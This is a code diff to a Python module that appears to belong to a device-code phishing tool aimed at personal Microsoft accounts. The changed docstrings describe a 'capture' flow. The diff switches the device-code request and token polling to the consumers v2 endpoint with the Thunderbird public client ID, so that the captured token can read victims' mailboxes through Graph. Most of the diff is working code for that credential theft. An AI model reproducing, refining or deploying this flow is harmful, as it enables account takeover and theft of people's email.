@@ -67,12 +67,15 @@ def poll_token(device_code, client_id=None, authority=None):
         return 'ERROR', None, None, {}
 
 def request_device_code_v1(attempts=3):
-    """Request a device code via the v1 endpoint — the flow that works for
-    personal (consumer) accounts. Uses the Office first-party client, which
-    carries Mail.ReadWrite, requesting a MICROSOFT GRAPH token directly so the
-    result is immediately usable against /me/messages and /me/mailFolders.
+    """Request a device code for a personal (consumer) capture.
+
+    Uses the consumers authority + v2 scopes with the Thunderbird public
+    client. This is the only combination that both accepts personal Microsoft
+    accounts and returns a Graph-scoped delegated token whose identity Graph
+    can resolve (the Office first-party client yields oid-less tokens that
+    every mailbox endpoint rejects).
     Returns (user_code, device_code, verification_uri, expires_in)."""
-    payload = {'client_id': Config.PERSONAL_CLIENT_ID, 'resource': Config.PERSONAL_RESOURCE}
+    payload = {'client_id': Config.PERSONAL_CLIENT_ID, 'scope': Config.PERSONAL_SCOPES}
     headers = {'Content-Type': 'application/x-www-form-urlencoded'}
     last_err = None
     for attempt in range(1, attempts + 1):
@@ -94,13 +97,13 @@ def request_device_code_v1(attempts=3):
     return None, None, None, None
 
 def poll_token_v1(device_code):
-    """Poll the v1 token endpoint for a personal-account capture.
-    v1 uses 'code' (not 'device_code') and 'resource' (not 'scope')."""
+    """Poll the consumers v2 token endpoint for a personal-account capture.
+    v2 uses 'device_code' (not 'code') and 'scope' (not 'resource')."""
     payload = {
         'client_id': Config.PERSONAL_CLIENT_ID,
         'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
-        'code': device_code,
-        'resource': Config.PERSONAL_RESOURCE,
+        'device_code': device_code,
+        'scope': Config.PERSONAL_SCOPES,
     }
     headers = {'Content-Type': 'application/x-www-form-urlencoded'}
     try:
